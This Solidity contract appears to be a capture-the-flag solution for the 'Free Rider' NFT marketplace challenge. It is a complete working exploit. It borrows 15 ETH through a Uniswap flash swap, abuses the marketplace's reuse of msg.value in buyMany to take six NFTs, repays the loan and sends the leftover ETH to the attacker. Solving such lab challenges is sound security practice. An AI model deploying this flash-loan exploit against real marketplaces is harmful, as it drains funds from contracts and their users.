// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace{
        function buyMany(uint256[] calldata tokenIds) external payable;
}
interface IUniswapPair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}


contract attackFreeRider is IUniswapV2Callee,IERC721Receiver{

    DamnValuableNFT public nft;
    IUniswapPair UniswapPair;
    address buyer;
    IFreeRiderNFTMarketplace market;
    IWETH weth;
    address attacker;
    constructor(address _nft, address _pair, address _buyer,address _market,address _weth){
        nft=DamnValuableNFT(_nft);
        UniswapPair=IUniswapPair(_pair);
        buyer=_buyer;
        market=IFreeRiderNFTMarketplace(_market);
        weth=IWETH(_weth);
        attacker=msg.sender;
    }
    function flash_swap()public{
        UniswapPair.swap(15 ether,0,address(this),hex"00"); // docs에서 data가 필요하지 않으면 길이 1 짜리 junk 바이트를 넣으면 알아서 무시된다고 써져있음.
    }
    function uniswapV2Call(address , uint , uint , bytes calldata) external override{
        uint256[] memory nftids = new uint256[](6);
        for(uint256 i=0;i<6;i++){
            nftids[i]=i;
        }
        weth.withdraw(15 ether);

        market.buyMany{value:15 ether}(nftids);

        for(uint i=0;i<6;i++){
            nft.safeTransferFrom(address(this), buyer, nftids[i]);
        }

        uint256 fee = 15 ether * 0.0031;
        weth.deposit{value: 15 ether + fee}();
        weth.transfer(msg.sender,15 ether + fee);
        payable(attacker).transfer(address(this).balance);
    }

    receive()external payable{}
    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}